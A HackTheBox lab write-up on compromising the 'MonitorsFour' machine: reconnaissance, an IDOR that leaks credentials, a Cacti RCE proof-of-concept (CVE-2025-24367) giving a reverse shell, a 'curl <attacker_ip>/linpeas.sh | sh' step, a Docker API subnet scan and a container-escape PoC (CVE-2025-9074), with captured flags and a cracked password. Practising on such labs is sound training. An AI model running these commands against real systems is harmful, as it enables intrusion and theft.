---
title: "MonitorsFour"
machine: MonitorsFour
tags: HackTheBox Machines
---
#### Write-Up for the HackTheBox Machine - MonitorsFour
<!--more-->
---
#### 001: Scan

The victim machine was scanned using `nmap`.
Ports returned from the tool were `port 80(http)` and `port 5985 (winrm)`.

```bash
nmap -sC -sV -p- 10.10.11.98
```

{{< screenshots "shot-001" >}}

---
#### 002: Hostname Mapping

Then, the IP of the victim is added to `/etc/hosts` and mapped to `monitorsfour.htb` for local hostanme resolution.
Thus, the website was viewed in browser for further examination.

{{< screenshots "shot-002" >}}

---
#### 003: Victim Fuzz

As the `nmap` report showed that the application was running on nginx, additional reconnaissance for the discovery of hidden files and subdomains was made using `ffuf`.
`common.txt` wordlist exposed various paths, but what seemed most interesting was the **Warning** from `/contact` response.

```bash
ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -ac
```
- `-ac` | switch specifies auto-calibration, which filters out false positive responses

{{< screenshots "shot-003" >}}

Initially, the response appeared like a hint that the victim may be vulnerable to File Inclusion. 
But after some common LFI probes to `/contact` and `/Router`, no results were found of potential vulnerability.
However, `/Router.php` when tested in `burpsuite` all responses returned `200 OK`, meaning that requests were handled on the server.

{{< screenshots "shot-004" >}}

Additionally, `/user` returned an error message, stating that a token paramenter is missing.

{{< screenshots "shot-006" >}}

---
#### 004: Virtual Host

`/Router.php` was assumed to be a front controller, since it is explicitly named `Router` and calls a prefix path `/var/www/app/`, which basically implied a centralized request handler to other website components. 
Hence, with `ffuf` the victim was probed for hidden subdomains.

```bash
ffuf -u http://FUZZ.monitorsfour.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
```

Enumeration for DNS subdomains returned nothing.
But, then the logical next step was probing for any virtual host.
After few seconds virtual host `cacti` was found with a redirection status `302`.

```bash
ffuf -u http://FUZZ.monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
```
- `-H` | switch specifies virtual host fuzzing

{{< screenshots "shot-005" >}}

---
#### 005: IDOR

At this point, from what was found in `/user` the victim was vulnerable to IDOR.
As the error response suggested a missing parameter, `token=0` has been requested as a parameter in the URL and the target responded with sensitive credentials.

{{< screenshots "shot-007" >}}

---
#### 006: MD5 Decryption

`admin` user was the target user worth the most for further examination.
However, its password was encrypted with MD5.
- `56b32eb43e6f15395f6c46c1c9e1cd36`

Hence, https://iotools.cloud/tool/md5-decrypt/ successfully decrypted the found password resulting to a more sensible text.
- `wonderful1`

{{< screenshots "shot-008" >}}

---
#### 007: Cacti Login

The username `admin` along with the decrypted password `wonderful1` were entered in the `cacti` log in page, but the credentials denied access.
Regardless, since it was assumed that the cracked password was correct, the `name` of the `admin` user was entered as a username instead.
Which successfully allowed access to the `cacti` dashboard.
- `username: marcus`

{{< screenshots "shot-009" >}}

---
#### 008: CVE-2025-24367

According to https://www.cvedetails.com/vulnerability-list/vendor_id-7458/product_id-12584/version_id-1907377/year-2025/opec-1/Cacti-Cacti-1.2.28.html the target was vulnerable to RCE, labeled as `CVE-2025-24367`.

{{< screenshots "shot-010" >}}

A comprehensive POC against the vulnerability is found in https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.
The steps for the reverse shell process on the attacker machine were quite straight forward, since a POC was used.

---
#### 009: Reverse Shell

Initially, the repo with the POC script was cloned.
```bash
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
```

Then as described, a Netcat server was running locally on the attacker.
```bash
nc -lvnp 4444 | switches allow listening mode on the specified port, with no DNS resolution and verbose output
```

A `venv` python virtual environment was created and activated, to enable `pip` installation of the POC required components.
- `python3 -m venv venv`
- `source venv/bin/activate`
- `pip install requests beautifulsoup4`

Once the installation has completed, the appropriate parameters (relevant findings) were passed to the `exploit.py` for the correct execution which allowed reverse connection.
```bash
python3 exploit.py -u marcus -p wonderful1 -i <attacker_ip> -l 4444 -url http://cacti.monitorsfour.htb
```

{{< screenshots "shot-011" >}}

---
#### 010: User Flag

A successful access to the system has been made, hence the first flag was captured by navigating to `/home/marcus` and `cat user.txt`.
- `8d3a167a22052489d5280ff86bbb5304`

{{< screenshots "shot-012" >}}

---
#### 011: Linpeas Enumeration

A local python server is set up on the attacker at a location where `linpeas.sh` was located.
On the victim machine `linpeas.sh` was requested and then executed for system enumeration
- `linpeas -h` | if `linpeas` is already installed the command will redirect to the directory where `linpeash.sh` is
- `sudo python3 -m http.server 80` | run the python server in `linpeas` directory
- `curl http://<attacker_ip>/linpeas.sh | sh` | on the victim machine do a GET request and then pipe to the execution of the enumeration script

Based on the provided report there where various potential expoitation methods.
However one that seemed interesting was `/.dockerenv`, which signified that the system we had access to was a docker container.
Additional verification that the victim was a docker container was with the command `hostname`, which returned a random hex value `821fbd6a43fa` indicating the first 12 characters of the full docker 64 hex character id.

{{< screenshots "shot-013" >}}

---
#### 012: Containerization

Furthermore, in /etc/hosts an entry showed a self-mapping for a docker container, confirming the environment is set in a docker gateway bridge.

{{< screenshots "shot-014" >}}

---
#### 013: Docker Reachability

As described the victim machine being Windows, it was assumed that the host was a Windows machine.
https://dev.to/nasrulhazim/how-to-access-your-localhost-api-from-docker-containers-7ai provided a brief guide towards accessing the Docker API through a container.
`host.docker.internal` is a resolution which allows access to a host machine, specifically if it is Windows or macOS.
A probe was made to `host.docker.internal` with the use of `curl`, and the name resolution resolved to `192.168.65.254` on `port 80`.
Essentially, the command returned an output that described the container has network access to the host's nginx server. 
```bash
curl -v http://host.docker.internal | switch sets `curl` to verbose-mode
```

{{< screenshots "shot-015" >}}

---
#### 014: Subnet Scan

Request to `host.docker.internal` resolved to an IP with the last octet `.254`, meaning it was the Docker bridge network gateway.
Thus, the next step was a scan on the entire `/24` subnet for potential hosts that may expose Docker API.
A simple Bash script has enabled a comprehensive subnet scan utilizing `curl`, and the host `192.168.65.7:2375` gave a response .
```bash
for i in $(seq 1 254); do (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375" && curl -v --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null) & done; wait
```
- `loops through the 192.168.65.0/24 subnet and probes port 2375 on each host`
- `identifies exposed Docker APIs by checking for ApiVersion in the response`
- `prints and then verbosely queries any host that responds positively`
- `executes scans in parallel and waits for all probes to finish`

---
#### 015: Root Flag

https://blog.qwertysecurity.com/Articles/blog3.html similar to our victim's case, described that any container on the current Docker version can have access to the API without proper authentication.
The vulnerability is labeled as `CVE-2025-9074` and it was later patched with Docker Desktop 4.44.3.
Nevertheless, a POC was found in https://github.com/3rendil/CVE-2025-9074-POC which the allowed the accessed container to mount the host filesystem.
The script was downloaded in `/tmp` directory of the current container from our attacker local python server and then bacame executable with `chmod +x cve-2025-9074`.
After successfull execution of the POC we had access to the created container with the mounter host filesystem.
The `root.txt` was found with `cat /hostfs/mnt/host/c/Users/Administrator/Desktop/root.txt`.
- `35713cf72da6c0530e65ce8f42a16e26`